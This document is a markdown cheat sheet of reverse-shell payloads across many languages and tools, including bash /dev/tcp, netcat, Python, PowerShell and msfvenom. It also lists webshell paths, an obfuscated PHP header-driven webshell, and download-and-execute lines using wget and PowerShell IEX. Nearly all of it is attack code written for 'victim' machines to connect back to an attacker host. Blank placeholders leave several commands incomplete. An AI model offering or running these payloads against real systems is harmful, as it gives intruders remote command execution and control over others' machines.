### :panda_face: Netcat Listen
```
nc -nvlp 813
```

#### :panda_face: /bin/bash

```
exec /bin/bash 0&0 2>&0
0<&196;exec 196<>/dev/tcp/MY-IP/813; sh <&196 >&196 2>&196
--------------
exec 5<>/dev/tcp/MY-IP/813
cat <&5 | while read line; do $line 2>&5 >&5; done  
---------------
while read line 0<&5; do $line 2>&5 >&5; done
---------------
bash -i >& /dev/tcp/MY-IP/813 0>&1
```
#### :panda_face: PHP
```
php -r '$sock=fsockopen("MY-IP",813);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"MY-IP"/813 0>&1'");?>
<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
```
#### :panda_face: Netcat
```
nc -lnvp 80
nc -e /bin/sh MY-IP 813
/bin/sh | nc MY-IP 813
rm -f /tmp/p; mknod /tmp/p p && nc MY-IP 4444 0/tmp/p
```
#### :panda_face: Telnet
```
rm -f /tmp/p; mknod /tmp/p p && telnet MY-IP 813 0/tmp/p
telnet MY-IP 80 | /bin/bash | telnet MY-IP 443
```
#### :panda_face: PERL
```
perl -e 'use Socket;$i="MY-IP";$p=813;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"MY-IP:813");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
perl -e 'use Socket;$i="MY-IP";$p=813;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
#### :panda_face: RUBY
```
ruby -rsocket -e'f=TCPSocket.open("MY-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### :panda_face: PYTHON
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY-IP",813));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### :panda_face: KALI
```
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/php-findsock-shell.php
/usr/share/webshells/php/findsock.c
/usr/share/webshells/php/simple-backdoor.php #### [http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd]
/usr/share/webshells/php/php-backdoor.php
/usr/share/webshells/perl/perl-reverse-shell.pl
/usr/share/webshells/perl/perlcmd.cgi
/usr/share/webshells/asp/
/usr/share/webshells/aspx/
```
***
NB The following is sourced from https://offsecnewbie.com/reverse_shell.php

#### :panda_face: Bash TCP:
###### :panda_face: Victim:
```
bash -i >& /dev/tcp// 0>&1

/bin/bash -i > /dev/tcp// 0<& 2>&1

exec 5<>/dev/tcp//;cat <&5 | while read line; do $line 2>&5 >&5; done

exec /bin/sh 0</dev/tcp// 1>&0 2>&0

0<&196;exec 196<>/dev/tcp//; sh <&196 >&196 2>&196
```

#### :panda_face: Bash UDP:
###### :panda_face: Victim:
```
sh -i >& /dev/udp// 0>&1
```

###### :panda_face: Listener:
```
nc -u -lvp 
```
#### :panda_face: Netcat:
```
nc -e /bin/sh  

nc -e /bin/bash  

nc -c bash  

mknod backpipe p && nc   0<backpipe | /bin/bash 1>backpipe 

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc   >/tmp/f

rm -f /tmp/p; mknod /tmp/p p && nc   0/tmp/p 2>&1

rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc   > f

rm -f x; mknod x p && nc   0<x | /bin/bash 1>x

ncat   -e /bin/bash

ncat --udp   -e /bin/bash
```

#### :panda_face: Telnet:
```
rm -f /tmp/p; mknod /tmp/p p && telnet   0/tmp/p 2>&1

telnet   | /bin/bash | telnet  444

rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet   > f

rm -f x; mknod x p && telnet   0<x | /bin/bash 1>x
```
#### :panda_face: Socat:
###### :panda_face: Victim:
```
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp::

socat tcp-connect:: exec:"bash -li",pty,stderr,setsid,sigint,sane
```

###### :panda_face: Listener:
```
socat file:`tty`,raw,echo=0 TCP-L:
```

###### :panda_face: Victim:
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp::
```
#### :panda_face: Perl:
#### :panda_face: Victim:
```
perl -e 'use Socket;$i="";$p=;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,":");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

```
###### :panda_face: Windows only, Victim:
```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,":");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
#### :panda_face: Python:
###### :panda_face: IP v4
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("",));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

export RHOST="";export RPORT=;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("",));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
###### :panda_face: IP v6
```
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
###### :panda_face: Windows only:
```
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('', )), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
#### :panda_face: PHP:
```
php -r '$sock=fsockopen("",);exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$s=fsockopen("",);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'

php -r '$s=fsockopen("",);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$s=fsockopen("",);`/bin/sh -i <&3 >&3 2>&3`;'

php -r '$s=fsockopen("",);system("/bin/sh -i <&3 >&3 2>&3");'

php -r '$s=fsockopen("",);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```
#### :panda_face: Ruby:
```
ruby -rsocket -e'f=TCPSocket.open("",).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e 'exit if fork;c=TCPSocket.new("","");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

```
#### :panda_face: NOTE: Windows only
```
ruby -rsocket -e 'c=TCPSocket.new("","");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
#### :panda_face: OpenSSL:
###### :panda_face: Attacker:
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

openssl s_server -quiet -key key.pem -cert cert.pem -port 

or

ncat --ssl -vv -l -p 
```
###### :panda_face: Victim:
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect : > /tmp/s; rm /tmp/s
```
#### :panda_face: Powershell:
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("",);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('',);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```
#### :panda_face: Awk:
```
awk 'BEGIN {s = "/inet/tcp/0//"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
#### :panda_face: TCLsh
```
echo 'set s [socket  ];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
```
#### :panda_face: Java:
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp//;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();
```
#### :panda_face: War:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
```
#### :panda_face: Lua:
###### :panda_face: Linux only
```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('','');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

###### :panda_face: Windows and Linux
```
lua5.1 -e 'local host, port = "",  local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
#### :panda_face: NodeJS:
```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(, "", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

require('child_process').exec('nc -e /bin/sh  ')

-var x = global.process.mainModule.require
-x('child_process').exec('nc   -e /bin/bash')

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
#### :panda_face: Groovy:
```
String host="";
int port=;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
#### :panda_face: Meterpreter Shell:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > reverse.exe

msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe > reverse.exe

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf >reverse.elf

msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= -f elf >reverse.elf

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="" LPORT= -f elf > shell.elf

msfvenom -p windows/meterpreter/reverse_tcp LHOST="" LPORT= -f exe > shell.exe

msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe > shell.exe

msfvenom -p osx/x86/shell_reverse_tcp LHOST="" LPORT= -f macho > shell.macho

msfvenom -p windows/meterpreter/reverse_tcp LHOST="" LPORT= -f asp > shell.asp

msfvenom -p java/jsp_shell_reverse_tcp LHOST="" LPORT= -f raw > shell.jsp

msfvenom -p java/jsp_shell_reverse_tcp LHOST="" LPORT= -f war > shell.war

msfvenom -p cmd/unix/reverse_python LHOST="" LPORT= -f raw > shell.py

msfvenom -p cmd/unix/reverse_bash LHOST="" LPORT= -f raw > shell.sh

msfvenom -p cmd/unix/reverse_perl LHOST="" LPORT= -f raw > shell.pl
```
#### :panda_face: Xterm:
```
xterm -display :1
Xnest :1
xhost +targetip
```
